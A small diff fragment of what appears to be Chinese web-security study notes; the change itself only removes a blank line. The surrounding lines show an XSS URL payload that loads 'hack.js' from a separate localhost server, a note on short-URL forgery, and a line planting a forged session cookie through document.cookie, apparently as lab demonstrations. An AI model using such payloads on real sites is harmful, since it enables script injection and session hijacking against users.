@@ -44,7 +44,6 @@ http://localhost:3000/?from=<script src="http://localhost:4000/hack.js"></script
 // 短域名伪造 https://dwz.cn/
 // 伪造cookie入侵 chrome
 document.cookie="cookie:sess=eyJ1c2VybmFtZSI6Imxhb3dhbmciLCJfZXhwaXJlIjoxNTUzNTY1MDAxODYxLCJfbWF4QWdlIjo4NjQwMDAwMH0="
-
 ```
 
 
